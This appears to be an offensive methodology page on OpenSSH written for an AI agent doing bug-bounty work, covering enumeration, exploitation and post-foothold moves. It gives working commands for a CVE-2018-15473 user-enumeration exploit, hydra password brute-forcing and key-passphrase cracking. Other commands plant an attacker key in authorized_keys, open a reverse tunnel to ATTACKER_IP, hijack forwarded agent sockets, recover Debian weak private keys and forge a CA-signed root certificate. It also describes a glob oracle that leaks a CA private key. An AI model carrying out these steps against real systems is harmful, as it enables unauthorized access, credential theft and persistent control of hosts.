---
technology: "OpenSSH"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
layer: remote-access daemon (TCP/22 default)
license: BSD-style (OpenSSH licence)
homepage: "https://www.openssh.com/"
github-repo: "openssh/openssh-portable"
provenance: "evidence-grounded (CVE-2018-15473 user-enum chain, three sshd_config audits, AuthorizedKeysCommand injection, agent hijack, 6 ssh2john files) + upstream-verified against sshd(8), ssh(1), sshd_config(5) man7 pages and NVD CVE records. Companion overview: [[ssh|SSH]]."
---

# OpenSSH attack surface

Target model: sshd on 22/tcp (banner announces exact version pre-auth), config at
`/etc/ssh/sshd_config` + `/etc/ssh/sshd_config.d/*.conf` drop-ins, per-user keys in
`~/.ssh/`. Authorization assumed throughout; destructive steps carry verify variants.
Protocol-level patterns (brute, key cracking, agent hijack, Dropbear) live on [[ssh|the SSH router page]].

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| User enumeration (CVE-2018-15473) | OpenSSH ≤ 7.7 | yes | Username list for password spray / phishing — Info/Low |
| Password auth brute / reuse | PasswordAuthentication yes (default) | yes | Shell as user — Critical if weak creds |
| authorized_keys write via other bug | any version + file-write primitive | n/a | Direct key-auth foothold + persistence — Critical |
| Restricted-key escape (command=/from=) | keys with options | credentialed | Full shell from forced-command key — Medium/High |
| PermitRootLogin yes + password | sshd_config | yes (credentialed) | Root shell — Critical |
| AuthorizedKeysCommand abuse | custom key-source program | varies | Arbitrary key injection — High |
| Agent-forwarding hijack | root on a -A bastion | n/a (post-foothold) | Auth as any transiting user — High |
| Weak host keys (Debian PRNG CVE-2008-0166) | keys generated on Debian-family 2006-09→2008-05 | n/a (key read) | Private-key recovery from precomputed sets — Critical |
| User-certificate forgery | TrustedUserCAKeys + CA key read or signing API/script | credentialed | Login as any principal incl. root — Critical |

Work top-down when you already hold a foothold; Phase 0 first from outside.

## Phase 0 — Fingerprint and version gate

```bash
nmap -p 22 -sV --script ssh-auth-methods 198.51.100.10
# 22/tcp open  ssh  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (protocol 2.0)  <- exact version, OS hint
# ssh-auth-methods lists accepted auth: publickey,password = PasswordAuthentication yes

ssh -o BatchMode=yes -o StrictHostKeyChecking=accept-new nonexistentuser@198.51.100.10
# "Permission denied (publickey,password)" — the method list itself is recon
```

Record the exact banner version: it gates every CVE below. `ssh-audit` (Python tool) adds
key-exchange/cipher audit if you need a config-hardening report rather than a foothold.

## Phase 1 — User enumeration (CVE-2018-15473)

OpenSSH **through 7.7** does not delay the bailout for an invalid user until after the
packet containing the public-key auth request is parsed, so invalid vs valid usernames are
distinguishable by response timing/packet count (fixed in 7.8; NVD: CVE-2018-15473).
Observed exemplar: an OpenSSH 7.2p2 host — the public exploit pulled a valid user
from a candidate list.

```bash
# Public PoC (exploit-db 45233 family — sends malformed publickey blobs, measures replies)
python3 45233.py --userList users.txt --outputFile out.txt 198.51.100.10
grep "is a valid" out.txt
```

Verify variant: run the tool once with a known-good username (e.g. from an email address
harvested off the web app) and once with a random string; a reproducible distinction is
your oracle. Patched servers give no stable separation. Expected finding severity is Low —
its value is the username list it feeds to Phase 2.

## Phase 2 — Authentication attacks

- **Password brute** (only if PasswordAuthentication yes): `hydra -L users.txt -P
  passes.txt ssh://198.51.100.10` — observed in two engagements. Expect
  MaxAuthTries (default 6) throttling; prefer 2–3 targeted candidates from breach data or
  the target's own leaks over rockyou-scale runs.
- **Private key recovery** — with any file read, target `~/.ssh/id_rsa`,
  `~/.ssh/id_ed25519`, `/home/*/\.ssh/*`, `/opt/*.key`, `*.bak`, and backup archives.
  Passphrase-protected keys: `/usr/share/john/ssh2john.py key > key.hash` then john with
  rockyou (observed repeatedly — all cracked
  rockyou-tier passphrases). Use: `chmod 600 key && ssh -i key user@198.51.100.10`.
- **authorized_keys write** — the moment any other service gives file write (redis
  CONFIG SET, webshell, NFS root-squash-off, LFI upload), the canonical persistence:
  ```bash
  echo "ssh-ed25519 AAAAC3...ATTACKER_KEY comment" >> /home/user/.ssh/authorized_keys
  ```
  authorized_keys writes and reads are the dominant SSH pivot.

## Phase 3 — authorized_keys options: the tricks and the escapes

An authorized_keys line may carry comma-separated options *before* the key. The ones that
change what your key can do (sshd(8), AUTHORIZED_KEYS FILE FORMAT):

```text
command="backup.sh"      forced command; client's command ignored (SSH_ORIGINAL_COMMAND env carries it)
from="10.0.0.*,*.corp.example.com"   source restriction by hostname/IP pattern, CIDR allowed
restrict                 disables pty, port/agent/X11 forwarding, ~/.ssh/rc — re-enabled piecemeal
no-pty,no-port-forwarding,no-agent-forwarding,no-X11-forwarding,no-user-rc
permitopen="h:p"         limit ssh -L destinations · permitlisten="h:p" limit ssh -R listeners
environment="K=V"        only if PermitUserEnvironment (off by default)
expiry-time="YYYYMMDD"   key stops working after the date
cert-authority + principals=...  key acts as a user-cert CA
```

Attack reading of each:

- **command= is not a sandbox.** The forced command runs under the user's shell; if that
  command evaluates arguments, expands globs, or the key lacks `no-pty`, environment or
  argv injection into the forced command is a classic escape (SSH_ORIGINAL_COMMAND is the
  usual injection carrier). Report "restricted key permits arbitrary command execution"
  with the exact injection.
- **from= is spoofable-adjacent**: it matches reverse-DNS names and IPs; a DNS-relevant
  position (or SSH from a compromised host inside the allowed pattern) defeats it.
- **Missing restrict on a backup key**: a key meant for one job still grants `ssh -L` into
  the interior network and agent relay unless the options say otherwise — check every
  optioned key line you can read for what it forgot to disable.
- **AuthorizedKeysCommand** (sshd_config): when a custom program supplies keys, it runs as
  AuthorizedKeysCommandUser; attack the program (command injection via username tokens,
  writable script, path tricks). One observed chain set
  AuthorizedKeysCommand/AuthorizedKeysCommandUser to inject a key source. Requirements
  worth checking on-target: root-owned, absolute path, not group/world-writable.

## Phase 4 — sshd_config audit (post-foothold)

```bash
grep -E 'PermitRootLogin|PasswordAuthentication|PubkeyAuthentication|AllowUsers|AuthenticationMethods' \
  /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*.conf 2>/dev/null
sshd -T | grep -E 'permitrootlogin|passwordauthentication|pubkeyauthentication'  # effective config
```

Evidence-grounded findings checklist:

- **PermitRootLogin yes** (observed) — root is a brute target and every lower
  compromise escalates straight to root SSH. Values: yes / prohibit-password (default;
  key-only root) / forced-commands-only / no.
- **PasswordAuthentication yes** (default where distros ship it) — brute + password-reuse
  exposure; combined with root this is the classic pair.
- **Drop-ins override expectations** (observed twice): modern distros load
  `/etc/ssh/sshd_config.d/*.conf` via Include; the comment in sshd_config saying
  "PermitRootLogin prohibit-password" can be overridden by a later drop-in — always dump
  the effective config with `sshd -T`, never trust the main file alone. First-obtained
  value wins per keyword.
- **AuthenticationMethods multi-factor** (observed: root requires key + second
  factor) — the factor chain is itself recon: which methods, in which order, tells you
  what to steal.
- **PubkeyAuthentication yes + PermitRootLogin prohibit-password** (observed) —
  password spray is dead; pivot to key theft or an authorized_keys write.
- **Host keys** `/etc/ssh/ssh_host_{rsa,ecdsa,ed25519}_key` — root-readable; with root,
  exfiltrate to MITM every client that trusts TOFU (or that runs
  StrictHostKeyChecking=no — observed repeatedly in such automation).

## Phase 5 — Post-foothold SSH utility and lateral movement

- **Tunnels**: `ssh -L 8443:127.0.0.1:443` (reach interior web), `ssh -D 1080` (SOCKS),
  `ssh -R 9001:127.0.0.1:9001 user@ATTACKER_IP` (egress reverse tunnel — observed).
- **Agent hijack** (observed): as root on a box users `ssh -A` through, watch the
  per-connection agent socket dirs (`/tmp/ssh-XXXXXXXX/agent.<pid>`), then
  `SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNN ssh targetuser@198.51.100.20`.
- **known_hosts** on conquered hosts = the victim's SSH map; hashed entries decode with
  known tools. This is lateral-movement intel, not a finding by itself.

## Weak host keys — Debian predictable PRNG (CVE-2008-0166)

A Debian-specific patch to OpenSSL (both `MD_Update` calls removed from
`md_rand.c` to silence Valgrind/Purify warnings) left the PRNG seeded **only
from the process ID**. The first vulnerable version (openssl 0.9.8c-1) entered
Debian unstable on 2006-09-17 and propagated to testing and etch; DSA-1571
fixed it on 2008-05-13 (NVD: CVE-2008-0166). Every SSH key — host or user —
generated on a Debian-family system (Debian, Ubuntu, derivatives) in that
window is one of a small precomputed set: the PID range gives 32,767 possible
random streams per architecture. Recovering such a key is a lookup, not a
search. GnuPG/GnuTLS keys are unaffected (they use their own RNG); any DSA key
merely *used* on an affected host must also be treated as compromised (DSA
nonce exposure).

Where this survives: legacy `authorized_keys` entries, archives of revoked
material (an `/etc/ssh/deprecated_keys`-style directory holding old public
keys plus a README about compromised keys is a strong tell), and
never-regenerated keys on ancient Debian-family hosts. Precomputed keysets
live in the g0tmi1k/debian-ssh repository as
`debian_ssh_rsa_<bits>_<arch>.tar.bz2` archives (the 4096-bit x86 set sits
under `uncommon_keys/`).

```bash
# 1. Recover a readable public key (authorized_keys line, deprecated-keys archive, host .pub)
cat /etc/ssh/deprecated_keys/*.pub

# 2. Fingerprint it — size + architecture decide which precomputed set to fetch
ssh-keygen -l -f suspect_key.pub
# 4096 SHA256:Gk...DQ root@legacy (RSA)          <- 4096-bit → the uncommon_keys archive

# 3. Fetch and unpack the matching keyset, then grep it for the public-key body
wget https://github.com/g0tmi1k/debian-ssh/raw/master/uncommon_keys/debian_ssh_rsa_4096_x86.tar.bz2
tar xjf debian_ssh_rsa_4096_x86.tar.bz2
grep -R "$(cat suspect_key.pub)" rsa/4096/
# rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub: ssh-rsa AAAA...   <- hit

# 4. The sibling file (same name minus .pub) IS the private key
cp rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269 weak_key
chmod 600 weak_key
ssh -i weak_key user@198.51.100.10
```

Notes:

- An *encrypted* weak private key cracks conventionally —
  `ssh2john.py key > key.hash && john -w=rockyou.txt key.hash` — but a server
  that deprecated the key rejects it; the precomputed-set lookup above is the
  path that still authenticates.
- For the report: keys with provenance in the vulnerable window are fatally
  defective and must be regenerated; matching the public key against the
  published keysets is the operational proof.

## User-certificate forgery — stolen or misused SSH CA

OpenSSH user certificates move trust from per-user keys to a CA listed in
`TrustedUserCAKeys` (sshd_config or a drop-in). Verified semantics
(sshd_config(5)):

- A certificate signed by a `TrustedUserCAKeys` CA authenticates as **any
  user in its principals list**.
- Unless `AuthorizedPrincipalsFile`/`AuthorizedPrincipalsCommand` is set, the
  login username itself must appear in the certificate's principals — so a
  cert minted with `-n root` authenticates as root on every host trusting
  that CA.
- Certificates with an empty principals list are rejected outright.
- `PermitRootLogin prohibit-password` (default) blocks only root *password*
  auth — certificate login as root still works.

**Phase A — recon.** Read the CA trust layout before anything else:

```bash
grep -R -E 'TrustedUserCAKeys|AuthorizedPrincipalsFile|AuthorizedPrincipalsCommand|PermitRootLogin' \
  /etc/ssh/sshd_config /etc/ssh/sshd_config.d/ 2>/dev/null
# TrustedUserCAKeys /opt/deploy/ca.pub                 <- CA trust exists
# AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u <- separate principals file: READ IT
cat /etc/ssh/auth_principals/*   # maps each user to the principals it accepts
```

With `AuthorizedPrincipalsFile`, the target user accepts a cert carrying any
principal in its file; without it, the cert must carry the username itself.
Either way the only secret that matters is the CA key.

**Phase B — mint and use a certificate** (CA private key in hand). Field
shapes for obtaining it: a readable CA keypair — group-readable in an
automation/deployment directory, or a decommissioned-CA folder left in a
user's home that the server still trusts — and leaked signing paths (an
internal signing API or a sudo signing script), covered in Phase C.

```bash
# 1. Fresh client keypair
ssh-keygen -t ed25519 -f /tmp/pwn -N ""

# 2. Sign: -s CA key · -I identity string · -n principals · -V validity · -z serial
ssh-keygen -s /path/to/ca -I "ops-provisioning" -n root -V +1h /tmp/pwn.pub
# Signed user key /tmp/pwn-cert.pub: id "ops-provisioning" serial 0 for root
#   valid from 2026-11-12T15:00:00 to 2026-11-12T16:01:53
# variant seen in the field: -V -5m:forever (backdated start, no expiry) with explicit -z

# 3. Verify what you minted — principals and signing CA
ssh-keygen -L -f /tmp/pwn-cert.pub
#         Type: ssh-ed25519-cert-v01@openssh.com user certificate
#         Key ID: "ops-provisioning"
#         Principals:
#                 root
#         Signing CA: ED25519 SHA256:...    <- must match the TrustedUserCAKeys content

# 4. Connect — ssh(1) auto-loads <key>-cert.pub next to the private key
ssh -i /tmp/pwn root@198.51.100.10
# root@target:~# id
# uid=0(root) gid=0(root) groups=0(root)
```

**Phase C — misuse paths when the CA key is not directly readable.**

- **Signing API**: provisioning services expose `POST /v1/sign`-style
  endpoints (JSON body: public key, username, principals) guarded by a bearer
  token embedded in an operator's script. Enumerate the supported-principals
  allowlist; privileged principals are typically refused server-side
  (`{"detail":"Root access must be granted manually. See the IT admin
  staff."}`) — but operational principals (support/webserver/analytics class)
  mint fine, their users' hosts trust the same CA, and the principal names
  each user accepts are readable from `AuthorizedPrincipalsFile`.
- **Signing-script glob oracle**: scripts that sign locally block the real CA
  by comparing the requested CA file's contents against it
  (`[[ $itca == $ca ]]`) — with the right-hand side **unquoted**, bash treats
  it as a glob pattern and a file ending in `*` matches any prefix. Submit
  `known-prefix + guess-char + *` as the CA file; the "use the API" error
  accepting or rejecting the guess leaks the CA private key one character at
  a time. Then sign locally (Phase B) for the principal you need, including
  `root_user`-style names the API refuses.
- **Host-CA layer**: `HostCertificate` lines and host CAs in the same config
  are the server-side mirror — a leaked host CA mints host certificates that
  MITM every client trusting it.

Reporting: certificate forgery is Critical whenever the CA is trusted by more
than one host — it is organizational key theft, not a box-local bug. Capture
the `ssh-keygen -L` output of the forged cert and the sshd_config lines as
evidence.

## Reporting notes

Quote the banner version with every version-gated claim. For CVE-2018-15473 include the
distinguishing transcripts (valid vs invalid user). For authorized_keys persistence,
report the write primitive (redis/webshell) as the root cause with the SSH key as impact.
Severity anchors: authorized_keys write = Critical; PermitRootLogin yes + weak root
password = Critical; user enumeration = Low.

## Appendix — Tool map

- **nmap** (`-sV`, ssh-auth-methods NSE) — Phase 0.
- **ssh-audit** — banner/kex/cipher audit — Phase 0.
- **hydra / medusa** — ssh password brute — Phase 2.
- **ssh2john (john package) + john/hashcat + rockyou** — key passphrase cracking — Phase 2.
- **ssh-keygen -l -f key** — fingerprint a found public key; **-y** — derive pubkey from a
  cracked private key — Phases 2-3.
- **sshd -T** — effective-config dump — Phase 4.
- Tools vault companions by name: nmap, hydra, john, hashcat, sshpass.

CVE index: 2018-15473 (user enumeration, ≤7.7, fixed 7.8) · 2023-48795 (Terrapin,
prefix-truncation kex downgrade — banner-gate before claiming) · 2024-6387 (regreSSHion
rce, signal-handler race on glibc builds 8.5p1–9.7p1 — verify version and conditions
before reporting) · 2008-0166 (Debian OpenSSL predictable PRNG — weak keys generated
on Debian-family systems 2006-09-17→2008-05-13, DSA-1571; see *Weak host keys*) ·
CVE-2018-10933 and kin are **libssh**, not OpenSSH — never file them
against an OpenSSH banner.
